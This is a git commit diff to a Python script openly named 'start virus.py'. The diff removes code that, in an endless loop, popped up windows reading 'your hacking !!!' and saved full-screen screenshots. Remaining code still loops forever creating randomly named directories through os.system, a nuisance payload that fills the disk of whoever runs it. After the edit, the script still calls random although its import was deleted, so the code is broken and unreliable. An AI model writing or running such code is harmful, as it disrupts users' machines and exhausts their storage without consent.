e1cff2f7d6fa7c0175a513406a4b1c2e52b736a7
Evil with angel morality <106548856+Evil-with-angel-morality@users.noreply.github.com>
2022-06-20 03:49:32 -0700

    Update start virus.py

--- Virous/start virus.py
+++ Virous/start virus.py
@@ -1,7 +1,6 @@
 import os
-import random
-from tkinter import *
-from PIL import ImageGrab
+
+
 
 
 
@@ -30,25 +29,5 @@ while True:
     try:
         name = str(random.randrange(1234567890904903756))
         os.system(f'mkdir {name}')
-    except:
-        pass
-
-
-    #Build window
-    try:
-        window = Tk()
-        window.title('your hacking !!!')
-        window.minsize(900,800)
-        window.maxsize(900,800)
-        Button(window, text='your hacking !!!').pack()
-        window.mainloop()
-    except:
-        pass
-
-    #Take screenshots of the page and save a lot
-    try:
-        nam = str(random.randrange(123456768677890))
-        sc = ImageGrab.grab()
-        sc.save(nam + '.png')
     except:
         pass
